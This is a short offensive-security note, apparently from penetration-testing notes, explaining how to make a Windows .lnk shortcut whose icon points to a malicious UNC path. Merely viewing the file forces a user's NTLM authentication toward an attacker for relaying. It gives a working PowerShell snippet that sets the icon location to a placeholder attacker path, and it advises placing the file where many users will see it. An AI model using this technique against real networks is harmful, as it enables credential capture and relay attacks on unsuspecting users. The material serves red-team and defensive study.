## Social Engineering an NTLM Authentication for Relaying

Windows Shortcut (`.lnk`) files are rendered with an icon that can be specified with a UNC path, perfect for social engineering an NTLM authentication for relaying.

Create the `.lnk` file with the following PowerShell snippet.

```powershell
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut($PATH_TO_SAVE_SHORTCUT_AT)
$shortcut.IconLocation = "$MALICIOUS_UNC_PATH"
$shortcut.Save()
```

`$PATH_TO_SAVE_SHORTCUT_AT` should be publicly accessible for maximum liklihood of being clicked by a user.
